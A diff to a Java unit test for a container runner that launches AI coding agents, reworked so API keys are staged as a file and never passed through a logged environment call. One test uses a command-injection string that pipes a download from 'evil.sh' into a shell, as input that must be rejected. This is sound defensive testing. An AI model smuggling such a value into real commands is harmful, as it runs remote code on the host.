@@ -3,6 +3,7 @@ package com.example.dvely.agent.infrastructure.codingagent;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.mockito.ArgumentMatchers.any;
+import static org.mockito.ArgumentMatchers.anyList;
 import static org.mockito.ArgumentMatchers.anyString;
 import static org.mockito.Mockito.RETURNS_SELF;
 import static org.mockito.Mockito.lenient;
@@ -126,8 +127,7 @@ class CodingAgentContainerRunnerTest {
     }
 
     private ContainerRunOutcome run() {
-        return runner.run("/host/checkout", null, List.of("claude", "-p", "hi"),
-                List.of("ANTHROPIC_API_KEY=sk-ant-secret"), Duration.ofSeconds(5));
+        return runner.run("/host/checkout", null, List.of("claude", "-p", "hi"), Duration.ofSeconds(5));
     }
 
     @Test
@@ -196,16 +196,18 @@ class CodingAgentContainerRunnerTest {
     }
 
     @Test
-    void execCarriesTheKeyInTheEnvironment() {
+    void neverPutsAnythingInTheExecEnvironment() {
         stubImagePresent();
         stubContainerLifecycle();
         stubExec(true, 0, "ok", "");
 
         run();
 
-        ArgumentCaptor<List<String>> env = ArgumentCaptor.captor();
-        verify(execCreateCmd).withEnv(env.capture());
-        assertThat(env.getValue()).containsExactly("ANTHROPIC_API_KEY=sk-ant-secret");
+        // Kept as its own test because it is a security invariant, not an implementation detail:
+        // docker-java's AbstrDockerCmd.exec() logs a reflective dump of every command field at
+        // DEBUG, so anything handed to withEnv can reach the application log verbatim. Secrets go
+        // through the staged file instead (see anEnvCredentialIsStagedAsAFileAndNeverPassedToWithEnv).
+        verify(execCreateCmd, never()).withEnv(anyList());
     }
 
     @Test
@@ -228,8 +230,7 @@ class CodingAgentContainerRunnerTest {
         stubContainerLifecycle();
         stubExec(false, 0, "partial", "");
 
-        ContainerRunOutcome outcome = runner.run("/host/checkout", null, List.of("claude", "-p", "hi"),
-                List.of(), Duration.ofMillis(50));
+        ContainerRunOutcome outcome = runner.run("/host/checkout", null, List.of("claude", "-p", "hi"), Duration.ofMillis(50));
 
         assertThat(outcome.timedOut()).isTrue();
         assertThat(outcome.exitCode()).isEqualTo(-1);
@@ -243,7 +244,7 @@ class CodingAgentContainerRunnerTest {
         stubContainerLifecycle();
         stubExec(false, 0, "", "");
 
-        runner.run("/host/checkout", null, List.of("claude"), List.of(), Duration.ofMillis(50));
+        runner.run("/host/checkout", null, List.of("claude"), Duration.ofMillis(50));
 
         verify(dockerClient).removeContainerCmd(CONTAINER_ID);
         verify(removeCmd).withForce(true);
@@ -270,9 +271,9 @@ class CodingAgentContainerRunnerTest {
         stubExec(true, 0, "ok", "");
 
         runner.run("/host/checkout",
-                new CodingAgentContainerRunner.AuthStep(
+                new CodingAgentContainerRunner.Credential.LoginCommand(
                         List.of("codex", "login", "--with-api-key"), "sk-proj-secret"),
-                List.of("codex", "exec", "hi"), List.of(), Duration.ofSeconds(5));
+                List.of("codex", "exec", "hi"), Duration.ofSeconds(5));
 
         // The key is uploaded with the archive API (plain HTTP PUT) under /run — never through
         // ExecStartCmd#withStdIn, which the OkHttp transport cannot keep open (measured:
@@ -308,17 +309,69 @@ class CodingAgentContainerRunnerTest {
     }
 
     @Test
-    void doesNotStageAnythingWhenThereIsNoStdinStep() {
+    void doesNotStageAnythingWhenThereIsNoCredential() {
         stubImagePresent();
         stubContainerLifecycle();
         stubExec(true, 0, "ok", "");
 
-        run(); // env-only credentialing (the Claude Code shape)
+        run(); // credential == null
 
         verify(dockerClient, never()).copyArchiveToContainerCmd(anyString());
         ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
         verify(execCreateCmd).withCmd(cmd.capture());
         assertThat(cmd.getValue()).containsExactly("claude", "-p", "hi");
+    }
+
+    @Test
+    void anEnvCredentialIsStagedAsAFileAndNeverPassedToWithEnv() throws Exception {
+        stubImagePresent();
+        stubContainerLifecycle();
+        stubExec(true, 0, "ok", "");
+
+        runner.run("/host/checkout",
+                new CodingAgentContainerRunner.Credential.EnvVar("ANTHROPIC_API_KEY", "sk-ant-secret"),
+                List.of("claude", "-p", "hi"), Duration.ofSeconds(5));
+
+        // withEnv is the leak: docker-java reflectively dumps every command field into a DEBUG log
+        // line, so a key placed there ends up in the application log verbatim. It must never be
+        // called with the secret — the staged file is the only channel.
+        verify(execCreateCmd, never()).withEnv(anyList());
+
+        ArgumentCaptor<java.io.InputStream> tarStream = ArgumentCaptor.captor();
+        verify(copyCmd).withTarInputStream(tarStream.capture());
+        try (TarArchiveInputStream tar = new TarArchiveInputStream(tarStream.getValue())) {
+            TarArchiveEntry entry = tar.getNextEntry();
+            assertThat(entry.getName()).isEqualTo("qeploy/stdin");
+            assertThat(new String(tar.readAllBytes(), StandardCharsets.UTF_8)).isEqualTo("sk-ant-secret");
+        }
+
+        // The wrapper exports the staged value and deletes the file; argv still rides as positional
+        // parameters, so only this constant text is ever parsed by a shell.
+        ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
+        verify(execCreateCmd).withCmd(cmd.capture());
+        String[] c = cmd.getValue();
+        assertThat(c[0]).isEqualTo("sh");
+        assertThat(c[2])
+                .contains("ANTHROPIC_API_KEY=\"$(cat /run/qeploy/stdin)\"")
+                .contains("rm -f /run/qeploy/stdin")
+                .contains("export ANTHROPIC_API_KEY")
+                .contains("exec \"$@\"");
+        assertThat(java.util.Arrays.copyOfRange(c, 4, c.length)).containsExactly("claude", "-p", "hi");
+        assertThat(c).noneMatch(a -> a.contains("sk-ant-secret"));
+    }
+
+    @Test
+    void rejectsAnEnvNameThatCouldBecomeShellSyntax() {
+        stubImagePresent();
+        stubContainerLifecycle();
+        stubExec(true, 0, "ok", "");
+
+        // The name is the one thing interpolated into the wrapper, so it is validated rather than
+        // trusted — even though today's callers only pass compile-time constants.
+        assertThatThrownBy(() -> runner.run("/host/checkout",
+                new CodingAgentContainerRunner.Credential.EnvVar("X; curl evil.sh|sh", "s"),
+                List.of("claude"), Duration.ofSeconds(5)))
+                .isInstanceOf(IllegalArgumentException.class);
     }
 
     @Test
@@ -328,8 +381,8 @@ class CodingAgentContainerRunnerTest {
         stubExec(true, 1, "", "bad key");
 
         ContainerRunOutcome outcome = runner.run("/host/checkout",
-                new CodingAgentContainerRunner.AuthStep(List.of("codex", "login"), "bad"),
-                List.of("codex", "exec", "hi"), List.of(), Duration.ofSeconds(5));
+                new CodingAgentContainerRunner.Credential.LoginCommand(List.of("codex", "login"), "bad"),
+                List.of("codex", "exec", "hi"), Duration.ofSeconds(5));
 
         // Running the agent anyway would burn the whole timeout retrying a 401 and produce output
         // that blames the model instead of the credential.
